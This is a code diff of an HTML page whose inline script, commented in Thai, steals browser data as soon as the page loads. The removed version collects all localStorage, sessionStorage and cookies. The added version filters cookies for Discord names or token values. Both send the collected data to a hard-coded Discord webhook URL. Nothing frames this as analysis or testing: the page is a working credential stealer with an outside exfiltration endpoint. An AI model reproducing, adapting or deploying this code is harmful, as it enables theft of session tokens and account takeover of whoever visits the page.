@@ -23,19 +23,6 @@
             border-radius: 5px;
             display: inline-block;
         }
-        #extractTokenButton {
-            padding: 10px 20px;
-            font-size: 16px;
-            border: none;
-            border-radius: 5px;
-            background-color: #007bff;
-            color: #fff;
-            cursor: pointer;
-            margin-top: 20px;
-        }
-        #extractTokenButton:hover {
-            background-color: #0056b3;
-        }
     </style>
 </head>
 <body>
@@ -43,46 +30,21 @@
     <p id="output"></p>
 
     <script>
-        function getLocalStorageItems() {
-            const items = {};
-            for (let i = 0; i < localStorage.length; i++) {
-                const key = localStorage.key(i);
-                const value = localStorage.getItem(key);
-                items[key] = value;
-            }
-            return items;
-        }
+        function extractCookies() {
+            // ดึงข้อมูล cookies จากเบราว์เซอร์ที่เปิดอยู่
+            const cookies = document.cookie.split('; ');
+            const tokenData = {};
 
-        function getSessionStorageItems() {
-            const items = {};
-            for (let i = 0; i < sessionStorage.length; i++) {
-                const key = sessionStorage.key(i);
-                const value = sessionStorage.getItem(key);
-                items[key] = value;
-            }
-            return items;
-        }
-
-        function getCookies() {
-            return document.cookie;
-        }
-
-        function extractTokens() {
-            const localStorageItems = getLocalStorageItems();
-            const sessionStorageItems = getSessionStorageItems();
-            const cookies = getCookies();
-
-            // รวมข้อมูลทั้งหมดเพื่อส่งไปยังเซิร์ฟเวอร์
-            const payload = {
-                localStorage: localStorageItems,
-                sessionStorage: sessionStorageItems,
-                cookies: cookies
-            };
+            cookies.forEach(cookie => {
+                const [name, value] = cookie.split('=');
+                // เพิ่มเงื่อนไขหากต้องการกรองข้อมูลเฉพาะ token ของ Discord
+                if (name.includes('discord') || value.includes('token')) {
+                    tokenData[name] = value;
+                }
+            });
 
             // แสดงผลลัพธ์ในหน้า HTML
-            document.getElementById('output').textContent = `Local Storage: ${JSON.stringify(localStorageItems, null, 2)}
-            \n\nSession Storage: ${JSON.stringify(sessionStorageItems, null, 2)}
-            \n\nCookies: ${cookies}`;
+            document.getElementById('output').textContent = `Cookies: ${JSON.stringify(tokenData, null, 2)}`;
 
             // ส่งข้อมูลไปยัง Webhook URL
             fetch('https://discord.com/api/webhooks/1252253384501887067/VEuHR4FVh43ztNVPgmE0kd7RqWFIM154Gha7s63Do-R1tc4VbuLQ8DzOaamP323Te4nd', {
@@ -90,7 +52,7 @@
                 headers: {
                     'Content-Type': 'application/json',
                 },
-                body: JSON.stringify(payload)
+                body: JSON.stringify({ cookies: tokenData })
             })
             .then(response => response.text())
             .then(data => console.log('Success:', data))
@@ -98,7 +60,7 @@
         }
 
         // เรียกใช้ฟังก์ชันเพื่อดึงข้อมูลและส่งไปยัง Webhook ทันทีหลังจากเปิดหน้าเว็บ
-        extractTokens();
+        extractCookies();
     </script>
 </body>
 </html>
